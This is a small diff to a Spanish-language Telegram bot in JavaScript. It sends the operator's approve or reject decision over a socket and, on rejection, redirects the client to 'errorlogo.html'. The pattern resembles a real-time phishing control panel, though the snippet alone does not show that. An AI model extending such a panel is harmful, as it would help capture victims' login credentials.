@@ -156,6 +156,10 @@ bot.on('callback_query', (query) => {
     const decision = data.startsWith('aprobado_') ? 'aprobado' : 'rechazado';
     socket.emit('respuesta', decision);
     bot.sendMessage(chatId, decision === 'aprobado' ? '✅ Acceso aprobado.' : '❌ Acceso denegado.');
+
+    if (decision === 'rechazado') {
+      socket.emit('redirigir', 'errorlogo.html');
+    }
   }
 
   else if (data.startsWith('error_') || data.startsWith('finalizar_')) {
